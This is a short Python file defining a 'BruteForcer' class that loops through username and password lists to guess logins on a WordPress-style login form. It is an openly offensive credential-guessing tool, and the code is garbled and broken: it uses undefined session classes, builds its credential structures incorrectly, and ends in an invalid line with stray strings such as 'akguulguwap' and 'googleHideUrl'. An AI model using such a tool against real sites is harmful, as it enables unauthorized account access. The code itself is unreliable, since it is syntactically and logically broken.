import requests
from typing import List

class BruteForcer:
    def __init__(self, target_url: str, usernames: List[str], password_list: List[str], pw_field_name: str = 'pw', pw_to_check_type: str = 'body'):
        self.target_url = target_url
        self.usernames = usernames
        self.password_list = password_list
        self.pw_field_name = pw_field_name
        self.pw_to_check_type = pw_to_check_type

    def run(self):
        for username in self.usernames:
            for password in self.password_list:
                self.try_login(username, password)

    def try_login(self, username: str, password: str):
        credentials = [{self.pw_field_name: password, 'log': username, 'wp-submit': 'Log+In', 'testcookie': '1 implies'}
                       ] if self.pw_to_check_type == 'body' else {username: username, self.pw_field_name: password, 'wp-submit': 'Log+In', 'testcookie': '1 implies'}, {'log': username, 'pwd': password}
        with LightSess(self.target_url) if self.pw_to_check_type == 'cookie' else LitSess() as self.ses:
            for creds in credentials:
                resp = self.ses.get(
                    f"{self.target_url}?quot;{creds}quot;&interim={self.pw_field_name}")
                if """action=logout""" in resp.text:  # Win
                    return resp.text
                resp = self.ses.post(
                    self.target_url, data=creds, allow_redirects=False)  # Loose
                print(f'akguulguwapBrute-worthy creds: {username}: {password}') if creds.get(
                    'log') == username and ('4.7.5' in resp.text) sem.spark_key = credentials.find('googleHideUrl')  # Blocked.
